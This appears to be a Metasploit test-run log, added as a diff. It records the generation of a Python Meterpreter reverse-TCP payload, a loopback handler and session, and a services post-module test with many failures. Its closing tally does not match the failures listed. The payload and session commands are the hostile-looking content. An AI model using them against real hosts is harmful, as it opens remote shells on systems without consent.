@@ -1,0 +1,42 @@
+use python/meterpreter/reverse_tcp
+generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-5420-183nae6.py -f raw MeterpreterTryToFork=false lport=6021 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> [*] Writing 493 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-5420-183nae6.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 20
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6021 
+[*] Sending stage (39804 bytes) to 127.0.0.1
+[*] Meterpreter session 21 opened (127.0.0.1:6021 -> 127.0.0.1:50055 ) at 2022-01-19 10:38:05 +0000
+use test/services
+[4mmsf6[0m post([1m[31mtest/services[0m) [0m> run session=21 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * unloadable Meterpreter extension: extapi
+[*] Running against session 21
+[*] Session type is meterpreter and platform is windows
+[-] FAILED: should modify config on a given service acanxK
+[-] Exception: RuntimeError : Could not open service. OpenServiceA error: FormatMessage failed to retrieve the error.
+[-] FAILED: should list services
+[-] Exception: Rex::Post::Meterpreter::ExtensionLoadError : The "extapi" extension is not supported by this Meterpreter type (python/windows)
+[-] FAILED: should start a disabled service aksyAm
+[-] FAILED: should return info on a given service  winmgmt
+[-] Exception: Rex::Post::Meterpreter::ExtensionLoadError : The "extapi" extension is not supported by this Meterpreter type (python/windows)
+[-] FAILED: should restart a started service W32Time
+[-] Exception: RuntimeError : Could not open service. OpenServiceA error: FormatMessage failed to retrieve the error.
+[+] should raise a runtime exception if no access to service
+[-] FAILED: should create a service  testes
+[-] FAILED: should return info on the newly-created service testes
+[-] Exception: Rex::Post::Meterpreter::ExtensionLoadError : The "extapi" extension is not supported by this Meterpreter type (python/windows)
+[-] FAILED: should delete the new service testes
+[-] Exception: RuntimeError : Could not open service. OpenServiceA error: FormatMessage failed to retrieve the error.
+[+] should raise a runtime exception if services doesnt exist
+[-] FAILED: should start W32Time
+[-] Exception: RuntimeError : Could not open service. OpenServiceA error: FormatMessage failed to retrieve the error.
+[-] FAILED: should stop W32Time
+[-] Exception: RuntimeError : Could not open service. OpenServiceA error: FormatMessage failed to retrieve the error.
+[-] FAILED: should return status on a given service winmgmt
+[-] Exception: RuntimeError : Could not open service. OpenServiceA error: FormatMessage failed to retrieve the error.
+[*] Testing complete in 0.458023
+[-] Passed: 11; Failed: 2
+[*] Post module execution completed
